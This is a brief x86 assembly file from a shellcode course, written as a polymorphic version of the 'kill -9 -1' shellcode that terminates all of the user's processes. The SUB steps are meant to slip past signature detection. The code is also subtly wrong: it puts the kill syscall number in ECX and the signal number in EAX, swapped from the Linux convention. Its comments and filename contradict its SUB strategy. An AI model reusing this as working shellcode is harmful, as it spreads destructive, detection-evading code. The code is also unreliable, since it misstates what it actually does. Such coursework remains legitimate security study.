; Filename: 	kill_polymorphic_add.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	kill -9 -1 polymorphic generator using SUB strategy

section .text

global _start

_start:
	xor eax, eax 	; setting EAX to 0
	xor ebx, ebx 	; setting EBX to 0
	xor ecx, ecx 	; setting ECX to 0

	mov cl, 0x45	; setting ECX to a random value
	sub cl, 0x20	; adding ECX values back to get 0x25

	mov al, 0xff
	sub al, 0xf6

	dec ebx		; EBX is now -1
	int 0x80
